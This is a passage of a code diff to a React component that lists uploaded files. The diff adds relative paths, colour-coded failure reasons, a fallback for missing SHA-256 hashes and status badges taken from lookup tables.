+                    <FileText className="w-3.5 h-3.5 text-[#f95721] shrink-0" />
+                    <span className="font-medium text-[#e7e5e4] truncate">{up.name}</span>
+                  </div>
+                  {(up.relativePath || up.reason) && (
+                    <div className="pl-5 text-[11px] text-[#a8a29e] whitespace-normal break-words select-text">
+                      {up.relativePath && <span>{up.relativePath}</span>}
+                      {up.relativePath && up.reason && <span> · </span>}
+                      {up.reason && (
+                        <span className={up.status === 'failed' || up.status === 'unsupported' ? 'text-red-300' : 'text-amber-300/90'}>
+                          {up.reason}
+                        </span>
+                      )}
+                    </div>
+                  )}
                 </div>
-                <div className="flex items-center gap-4 text-[#a8a29e] font-mono text-[11px]">
-                  <span>SHA-256: <strong className="text-[#fafaf9] font-normal">{up.hash.slice(0, 16)}...</strong></span>
-                  <span>Extracted: <strong className="text-[#f95721]">{up.events} events</strong></span>
-                  <span className="text-emerald-400 font-semibold">{up.status}</span>
+                <div className="flex items-center gap-4 text-[#a8a29e] font-mono text-[11px] shrink-0">
+                  <span>
+                    SHA-256:{' '}
+                    <strong className="text-[#fafaf9] font-normal">
+                      {up.hash && up.hash !== '-' ? `${up.hash.slice(0, 16)}...` : '-'}
+                    </strong>
+                  </span>
+                  <span>
+                    Extracted: <strong className="text-[#f95721]">{up.events} events</strong>
+                  </span>
+                  <span className={`${STATUS_BADGE_CLASS[up.status]} font-semibold`}>
+                    {STATUS_LABEL[up.status]}
+                  </span>
                 </div>
               </div>
             ))}
